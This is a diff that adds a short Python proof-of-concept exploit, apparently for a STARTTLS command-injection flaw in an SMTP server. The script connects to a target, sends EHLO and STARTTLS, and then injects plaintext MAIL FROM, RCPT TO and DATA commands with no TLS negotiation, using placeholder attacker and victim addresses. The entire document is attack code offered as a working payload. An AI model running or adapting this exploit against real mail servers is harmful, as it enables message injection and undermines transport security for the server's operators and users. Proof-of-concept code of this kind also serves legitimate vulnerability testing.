@@ -1,0 +1,23 @@
+```python
+import socket
+
+# Example payload to exploit the vulnerability
+def exploit_vulnerability(target_host, target_port):
+    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+        s.connect((target_host, target_port))
+        # Send EHLO command
+        s.sendall(b'EHLO attacker.com\r\n')
+        # Send STARTTLS command
+        s.sendall(b'STARTTLS\r\n')
+        # Here, an attacker would attempt to manipulate the connection
+        # by sending additional unencrypted commands after STARTTLS
+        s.sendall(b'MAIL FROM:<attacker@example.com>\r\n')
+        s.sendall(b'RCPT TO:<victim@example.com>\r\n')
+        s.sendall(b'DATA\r\nSubject: Test\r\n\r\nThis is a test message.\r\n.\r\n')
+        s.sendall(b'QUIT\r\n')
+        response = s.recv(4096)
+        print(response.decode())
+
+# Example usage
+# exploit_vulnerability('localhost', 8025)
+```
